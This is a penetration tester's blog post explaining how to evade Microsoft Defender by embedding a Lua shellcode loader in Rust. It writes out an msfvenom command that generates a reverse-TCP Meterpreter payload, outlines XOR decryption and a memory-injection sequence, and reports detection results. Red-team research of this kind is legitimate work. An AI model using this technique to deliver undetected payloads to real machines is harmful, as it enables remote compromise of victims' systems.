# https://blog.shellntel.com/p/evading-microsoft-defender

0

- [#\_shellntel Cybersecurity Blog](https://blog.shellntel.com/)
- Posts
- Evading Microsoft Defender

# Evading Microsoft Defender

## by Embedding Lua into Rust

![Author](https://media.beehiiv.com/cdn-cgi/image/fit=scale-down,format=auto,onerror=redirect,quality=80/uploads/user/profile_picture/58de0b6e-ba45-43ba-8b4b-3ee3e6cd294f/thumb_desktop-wallpaper-bully-scholarship.jpg)

[Dylan Reuter](https://blog.shellntel.com/authors/58de0b6e-ba45-43ba-8b4b-3ee3e6cd294f)

July 30, 2024

I recently started learning about the world of game modding. I have always played games on a console, so modding was not something I ever pursued. However, after picking up the PC version of my favorite game, I discovered a world of interesting mods out there and it definitely piqued my interest. While I was perusing GitHub over the weekend and looking at the various mods available for the game, I noticed that they were all written in Lua. Now before becoming a penetration tester, I worked as a software engineer. So, learning about and dabbling with new programming languages has always been an interest of mine.

I had heard of Lua but didn’t know anything about it and had never used it in any capacity. Naturally, I started reading about the language and why it’s so popular in game modding. According to [lua.org](https://lua.org/?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender): _Lua is a powerful, efficient, lightweight, embeddable scripting language. It supports procedural programming, object-oriented programming, functional programming, data-driven programming, and data description._ The fact that it is powerful, lightweight, and embeddable seem to be why it is a popular choice amongst game modders as well. Lua sounded pretty awesome to me, and I immediately started thinking about how it could be used in offensive development. Using “unpopular” programming languages is a proven tactic attackers have been using to help evade detection.

[This article](https://www.darkreading.com/threat-intelligence/attackers-use-of-uncommon-programming-languages-continues-to-grow?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) from 2021 mentions how attackers are using Go, Nim, Rust, and DLang to bypass defenses. However, in 2024 I think it’s safe to say that Go, Nim, and Rust are all popular choices now (sorry DLang). Other examples of less popular programing languages used in modern malware are [DarkGate](https://www.netskope.com/blog/new-darkgate-variant-uses-a-new-loading-approach?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) written in [Delphi](https://docwiki.embarcadero.com/RADStudio/Athens/en/Category:Delphi?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender), and [Mortar](https://github.com/0xsp-SRD/mortar?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) written in [Pascal](https://www.freepascal.org/docs.var?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender). Anti-Virus software can have a more difficult time detecting malware in uncommon languages due to a lack of robust detection mechanisms for it. The lesser-used the language, the less likely it is that antivirus engines have developed a comprehensive database of known malware signatures and heuristics to use for detection. Offensive development is a great creative outlet. When it comes to AV evasion, thinking outside the box can go a long way in determining the success of your payload. Sometimes, the more weird or abstract and convoluted your payload is, the better. So, buckle up – things are going to get weird.

**Project Setup**

So what we are going to do is create a basic shellcode loader in Lua and embed it into a Rust program. We will then create the same basic shellcode loader in Rust and see how they fair against each other in terms of detection. I chose Rust for this over something like C because I am a big fan of Rust for offensive development. I have written several other blog posts creating offensive tools using Rust, and I even gave a talk at SynerComm’s 2023 IT Summit on why it’s a great language for offensive development. In order to use Lua in our Rust project, we will use the [mlua](https://github.com/mlua-rs/mlua?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) crate and add the features “vendored” and “luajit”. This will ensure our binary has everything it needs to execute our Lua code without needing Lua installed on the target machine. So, our Cargo.toml file will look like this:

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture1.png)

In our [main.rs](https://main.rs/?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) file, we will use the handy “ _include\_bytes!”_ macro to load our meterpreter shellcode which we will generate later, create our Lua instance, and load the FFI and BIT libraries. FFI is needed so we can use the WinAPI, and BIT is needed for the XOR decryption we will be performing on the shellcode.

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture2.png)

Next, we can call _lua.load()_ where we will write all the Lua code we want to execute. The first thing we will do is call _ffi.cdef\[\[\]\]_ where we will define all the Windows API functions and constants we want to use. We are just doing a basic shellcode loader, so we will use the following WinAPI functions:

- VirtualAlloc

- VirtualProtect

- CreateThread

- WaitForSingleObject


To make life easier and allow us to copy pasta the functions from MSDN, we can create type definitions of the C types to their Windows Types. E.g., unsigned long => DWORD. Our ffi.cdef will look like this:

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture3.png)

A really cool feature about embedding Lua is that we can pass variables from Rust to Lua and vice versa. We need to pass in our shellcode vector, and we can also pass in the shellcode length while we are at it. The Lua FFI [documentation](https://luajit.org/ext_ffi_semantics.html?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) has some good tables showing the different Lua data types and their C equivalent.

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture4.png)

[https://luajit.org/ext\_ffi\_semantics.htm](https://luajit.org/ext_ffi_semantics.htm?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender)

We will create a Lua table in Rust and add our shellcode and shellcode length to global variables that we can use in our Lua code. This all needs to go above our lua.load() method.

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture5.png)

Next, we will call _VirtualAlloc_ to create space for our shellcode. We will also create the C buffer of type uint8 array that we will copy our shellcode into. _Note: the # preceding the variable name gets the length of the array._

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture6.png)

Now we will need to decrypt our shellcode and copy it into the address space we allocated with VirtualAlloc. We are not cutting any corners here so we will be encrypting our shellcode just like you would do in the real world. I generated MSF shellcode with the following command (adjust your LHOST as necessary): _msfvenom -p windows/x64/meterpreter\_reverse\_tcp LHOST=10.2.99.1 LPORT=443 -f raw -o msfshellcode.bin EXITFUNC=thread_   We will be encrypting our shellcode with XOR because we can decrypt it easily in our Lua program without needing any third-party crypto libraries. I recommend using this [shellcode-encryption](https://github.com/djackreuter/shellcode-encryption?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) suite on a Windows machine to XOR the payload. Instead of a single byte XOR key, the [xor.py](https://xor.py/?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) script uses a rotating key for enhanced security. In my case, I used “secretkey” and wrote it to the “src” directory of the Rust project. Be sure to copy the hex key that it prints.

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture7.png)

Next, we will decrypt our XOR’d shellcode, copy the shellcode into the C buffer, and copy the C buffer into the address space we created with VirtualAlloc.

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture8.png)

Those with a keen eye might have noticed some weirdness with the array indices. In Lua, the index starts at 1, but when using the ffi C array, the index starts at 0.   Finally, we can call VirtualProtect to change the protections to PAGE\_EXECUTE\_READ, then kickoff our shellcode by calling CreateThread and WaitForSingleObject to wait indefinitely. On the Rust side of things, we can set a name for our Lua code block, which is handy if you are calling multiple, and call exec() to run it. The final piece will look like the following:

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture9.png)

Something interesting I think is worth mentioning here is the line: _local oldProtect =_ _[ffi.new](https://ffi.new/?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender)_ _(“DWORD\[0\]”)_ The [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) function takes a pointer to a DWORD which will receive the old memory protection value. By creating this new DWORD as an array with 0 elements, we are essentially creating the DWORD pointer.

Now for the exciting part, the test!

For an equal comparison, I created the same basic shellcode injector in pure Rust. It follows the same simple injection method of: VirtualAlloc => XOR decrypt => Copy shellcode => VirtualProtect => CreateThread => WaitForSingleObject It also uses the same XOR’d meterpreter shellcode with the same decryption key. You can view that repository [here](https://github.com/djackreuter/rustbaseline?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender).

For the lab setup, I am using [Ludus](https://docs.ludus.cloud/?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) and have Metasploit running on a Kali machine and testing the payloads on a Windows 11 Enterprise machine with Real-time protection turned On and Automatic sample submission turned Off. PSA to always turn off Automatic sample submission! First, I tested the Rust Lua Loader and I was able to get a Meterpreter shell with no complaints from Defender. Pretty cool!

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture11.png)

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture12.png)

The pure Rust version, rust baseline, was a little disappointing. I could not even drop it to disk without it being detected.

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture13.png)

However, I think that speaks to how powerful the embedded Lua payload is! Especially considering the fact that the Meterpreter shellcode is contained in the binary, and that we are using a very basic shellcode injection method.

For the final test, I wanted to see how both payloads did on [antiscan.me](https://antiscan.me/?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender). Normally, I never upload payloads to ANY analysis site. They say they don’t distribute results, but I don’t trust it. Unfortunately, [antiscan.me](https://antiscan.me/?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) was not working so I had to use VirusTotal which definitely distributes results (RIP payloads).

The Rust baseline payload was detected by 13 vendors.

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture14.png)

However, the Rust Lua loader was only detected by one.

![](https://www.synercomm.com/wp-content/uploads/2024/10/Picture15.png)

I was very impressed with the results and the power of Lua. Hopefully embedded Lua can serve as another tool in your offensive development arsenal. Full source code for each project is available below.

[Rust Lua Loader](https://github.com/djackreuter/rustlualoader?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender) [Rust Baseline](https://github.com/djackreuter/rustbaseline?utm_source=blog.shellntel.com&utm_medium=referral&utm_campaign=evading-microsoft-defender)

Thanks for reading!

#### Keep reading

[![DEF CON 33 and Meshtastic on the LILYGO T-Deck Plus ](https://media.beehiiv.com/cdn-cgi/image/format=auto,width=800,height=421,fit=scale-down,onerror=redirect/uploads/asset/file/7964a9e3-1c75-431d-9cf3-33259c3281a1/IMG_097-2.JPEG)\\
\\
**DEF CON 33 and Meshtastic on the LILYGO T-Deck Plus** \\
\\
Ryan Zagrodnik /](https://blog.shellntel.com/p/def-con-33-and-meshtastic-on-the-lilygo-t-deck-plus) [![Building a Raspberry Pi Dropbox](https://media.beehiiv.com/cdn-cgi/image/format=auto,width=800,height=421,fit=scale-down,onerror=redirect/uploads/asset/file/df0396cb-f937-438f-8677-9feb52870db8/tng.jpg)\\
\\
**Building a Raspberry Pi Dropbox** \\
\\
Chad Finkenbiner /](https://blog.shellntel.com/p/building-a-raspberry-pi-dropbox) [![Hash Master 1000 Version 2.0](https://media.beehiiv.com/cdn-cgi/image/format=auto,width=800,height=421,fit=scale-down,onerror=redirect/uploads/asset/file/b50efc26-19fe-4ea1-bb1c-c75614f13ae5/WWHF-SynerComm-HM1K.png)\\
\\
**Hash Master 1000 Version 2.0** \\
\\
Tool Drop from Wild West Hackin' Fest Mile High\\
\\
Brian Judd /](https://blog.shellntel.com/p/hash-master-1000-version-2-0)

View more

Twitter Widget Iframe